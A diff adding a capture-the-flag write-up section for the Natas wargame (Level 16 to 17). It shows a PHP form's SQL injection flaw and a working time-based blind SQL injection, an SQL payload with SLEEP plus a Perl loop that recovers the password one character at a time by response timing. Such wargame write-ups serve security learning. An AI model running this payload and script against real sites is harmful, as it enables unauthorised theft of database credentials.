@@ -1365,3 +1365,113 @@ while (length $natas17_pass < 32) {
 - Is important to understand that, given how the `grep` command is being used, the `$ch` tested could be at the beginning or the end of the password. Because of that, I decided to just run the checker 2 times.
 
 ## Level 16 ➡ Level 17
+
+It appears to be the same website as [Level 14 ➡ Level 15](#level-14--level-15). The form looks the same.
+
+- Test the form.
+- Inspect resources.
+- Find vulnerability and understand how to abuse it.
+- Get the password.
+
+### Testing form 16
+
+Some basic tests:
+
+- Blank data: shows a blank page.
+- Regular data: shows a blank page.
+
+### Inspection 16
+
+#### HTML inspection 16
+
+Nothing interesting.
+
+#### PHP inspection 16
+
+It looks like the same code as [level 14 to 15](#php-inspection-14). The only difference is that, this time, the `echo` statement that printed the result of the SQL query, is commented:
+
+```php
+<?php
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas17', '<censored>');
+    mysqli_select_db($link, 'natas17');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) > 0) {
+            //echo "This user exists.<br>";
+        } else {
+            //echo "This user doesn't exist.<br>";
+        }
+    } else {
+        //echo "Error in query.<br>";
+    }
+    mysqli_close($link);
+}
+```
+
+### Resolution 16
+
+The first thing is understand the problem. The SQL injection vulnerability still exists, the problem is that I don't have any apparent way of checking the result on the website.
+
+A key focus is to understand that the website **is still** vulnerable to SQL. So, I can use SQL code to kind of "give me a hint" on the frontend if what I am trying is correct.
+
+One way of doing this is with the `SLEEP` command. It pauses the serving of the response an X amount of seconds.
+ I can use this to confirm if the brute force operation is correct or not.
+
+- TLDR: if response takes too long: something. If response is fast: something else.
+
+#### Overview of the SQL injection 16
+
+The SQL code that will eventually run on the server:
+
+```sql
+SELECT * FROM users WHERE username="natas18" AND BINARY password LIKE "candidate%"AND SLEEP(10)#";
+```
+
+#### Bruteforcing 16
+
+They key factor is the comparison between the response times. First I define a function that calculates it:
+
+```perl
+sub responsetime {
+    my ($username) = @_;
+    
+    my $start_time = time();
+    my $response = req $username; # same req function used in level14-15
+    my $end_time = time();
+
+    return $end_time - $start_time;
+}
+```
+
+- For this particular scenario it's not necessary to be that precise, so Perl's own `time()` is enough. For other cases consider: `use Time::HiRes qw(time);`.
+
+Then I use it in the brute force operation:
+
+```perl
+my $sleep = 5;
+
+while (length $natas18_pass < 32) {
+    for my $ch (split //, $chars) {
+       my $candidate = "$natas18_pass$ch";
+       print "Attempting password: $candidate\n";
+       my $query = "natas18\"AND BINARY password LIKE \"$candidate%\"AND SLEEP($sleep)#";
+
+       if (responsetime($query) > 3) {
+           $natas18_pass = $candidate;
+           print "$natas18_pass\n";
+           last;
+       }
+   }
+}
+```
+
+The sleep time of 5 seconds is enough to tell the difference.
+
+## Level 17 ➡ Level 18
